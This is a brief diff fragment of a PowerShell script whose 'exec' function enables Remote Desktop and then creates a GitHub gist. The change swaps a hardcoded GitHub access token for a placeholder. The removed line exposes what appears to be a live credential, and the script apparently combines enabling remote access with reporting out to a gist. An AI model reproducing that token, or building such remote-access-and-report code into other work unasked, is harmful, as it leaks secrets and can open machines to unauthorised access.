@@ -101,7 +101,7 @@ function Create-Gist {
 
 function exec {
     Enable-RemoteDesktop
-    $Token = "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"
+    $Token = "Token"
     Create-Gist -Token $Token
 }
 
